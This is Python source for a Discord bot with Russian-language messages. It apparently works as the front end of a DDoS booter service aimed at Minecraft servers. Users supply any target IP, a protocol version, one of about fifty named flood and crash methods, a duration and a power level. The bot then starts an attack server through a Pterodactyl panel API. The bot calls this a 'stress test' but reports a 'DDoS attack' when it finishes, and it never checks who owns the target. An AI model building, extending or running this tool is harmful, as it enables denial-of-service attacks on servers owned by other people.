import discord
import requests
import socket
import asyncio
from discord.ext import commands
from mcstatus import JavaServer
from datetime import datetime, timedelta

TOKEN = ""
PTERO_API_KEY_FREE = ""
PANEL_URL = ""
SERVER_ID_FREE = ""
CHANNEL_ID = 
CHANNEL_ID2 = 
CHANNEL_ID3 = 
ADMIN_ID = 

bot = commands.Bot(command_prefix="$", intents=discord.Intents.all())
bot.remove_command('help')

free_cooldown = None

print('======================================')
print('By Dartsash')
print('======================================')

@bot.event
async def on_ready():
    print('LunoFree запустился!')
    await bot.change_presence(status=discord.Status.online, activity=discord.Game('SolarisBot | SolarisHub'))

PROTOCOLS = {
    "1.20.4": 765,
    "1.20.2": 764,
    "1.20.1": 763,
    "1.19.4": 762,
    "1.19": 759,
    "1.18.2": 758,
    "1.17.1": 756,
    "1.16.5": 754,
    "1.15.2": 578,
    "1.14.4": 498,
    "1.13.2": 404,
    "1.12.2": 340,
    "1.8.9": 47
}

ATTACK_METHODS = [
    "BigHandshake", "Bigpacket", "Botjoiner", "ChatSpam", "ColorCrasher",
    "CPUDowner", "Doublejoin", "EmptyNames", "ExtremeJoin", "ExtremeKiller",
    "Handshake", "InstantDowner", "InvalidData", "InvalidNames", "InvalidSpoof",
    "IPSpoofFFlood", "Join", "LegacyPing", "LegitnameJoin", "LocalHost",
    "LongHost", "LongNames", "Memory", "MOTD", "nAntiBot", "NettyDowner",
    "Network", "NewNullPing", "NullPing", "Ping", "PingJoin", "Query", "Queue",
    "QuitExceptions", "Ram", "RandomExceptions", "RandomPacket", "ServerFucker",
    "Slapper", "SmartBot", "Spoof", "TcpBypass", "TcpHit", "UltimateKiller",
    "UltimateSmasher", "UnexpectedPacket", "WaterFallBypass", "XDjoin", "XDSpam",
    "Aegis", "EmptyNames", "UUIDCrash", "BungeeDowner", "BotRaid", "TCPFlow"
]

async def send_command(command, server_id, api_key):
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
        "Accept": "Application/vnd.pterodactyl.v1+json"
    }
    data = {"command": command}
    response = requests.post(f"{PANEL_URL}/api/client/servers/{server_id}/command", json=data, headers=headers)
    return response.status_code == 204

@bot.command()
async def free(ctx, ip: str, protocol: int, attack_type: str, duration: int, power: int, extra: int):
    global free_cooldown

    if ctx.channel.id != CHANNEL_ID:
        await ctx.send("🚫 **Эта команда разрешена только в определенном канале!**")
        return

    if free_cooldown and free_cooldown > datetime.now():
        remaining_time = (free_cooldown - datetime.now()).total_seconds()
        await ctx.send(f"⏳ **Атака уже запущена! Попробуйте через {int(remaining_time)} секунд.**")
        return

    is_admin = ctx.author.id == ADMIN_ID

    attack_type = attack_type.strip().capitalize()

    if protocol not in PROTOCOLS.values():
        await ctx.send(f"❌ **Неверный протокол! Допустимые протоколы:**\n```{', '.join([f'{v} ({k})' for k, v in PROTOCOLS.items()])}```")
        return

    if attack_type not in ATTACK_METHODS:
        await ctx.send(f"❌ **Неверный метод атаки! Допустимые методы:**\n```{', '.join(ATTACK_METHODS)}```")
        return

    if not is_admin:
        if duration > 30:
            await ctx.send("❌ **Время атаки не может превышать 30 секунд!**")
            return
        if power > 100:
            await ctx.send("❌ **Мощность атаки не может превышать 100!**")
            return
        if extra > 1:
            await ctx.send("❌ **Количество потоков не может превышать 1!**")
            return

    headers = {
        "Authorization": f"Bearer {PTERO_API_KEY_FREE}",
        "Content-Type": "application/json",
        "Accept": "Application/vnd.pterodactyl.v1+json"
    }

    start_response = requests.post(f"{PANEL_URL}/api/client/servers/{SERVER_ID_FREE}/power", json={"signal": "start"}, headers=headers)

    if start_response.status_code == 204:
        free_cooldown = datetime.now() + timedelta(seconds=duration + 20)

        embed = discord.Embed(title="🚀 **Тестирование оборудования запущено!**", description="**Free-Tests**", color=discord.Color.green())
        embed.add_field(name="🌍 **Айпи**", value=f"```{ip}```", inline=False)
        embed.add_field(name="🛠 **Метод**", value=f"```{attack_type}```", inline=True)
        embed.add_field(name="⏳ **Время**", value=f"```{duration} сек.```", inline=True)
        embed.add_field(name="📡 **Протокол**", value=f"```{protocol}```", inline=True)
        embed.add_field(name="🔥 **Мощность**", value=f"```{power}```", inline=True)
        embed.set_footer(text="Стресс-тест в процессе...")
        msg = await ctx.send(embed=embed)

        await asyncio.sleep(2)
        commands_list = [ip, protocol, attack_type, duration, power, extra]

        for cmd in commands_list:
            success = await send_command(str(cmd), SERVER_ID_FREE, PTERO_API_KEY_FREE)
            if success:
                await asyncio.sleep(1)
            else:
                embed.color = discord.Color.red()
                embed.set_footer(text=f"⚠️ Ошибка при отправке команды: {cmd}")
                await msg.edit(embed=embed)
                return

        embed.set_footer(text="✅ **Все команды отправлены! Стресс-тест запущен!**")
        await msg.edit(embed=embed)
        await asyncio.sleep(duration)
        await ctx.send("✅ **Дудос атака завершена! Можно отправлять другие атаки.**")
        free_cooldown = None

    else:
        embed = discord.Embed(title="❌ **Ошибка запуска сервера!**", description="Попробуйте еще раз позже.", color=discord.Color.red())
        await ctx.send(embed=embed)

bot.run(TOKEN)
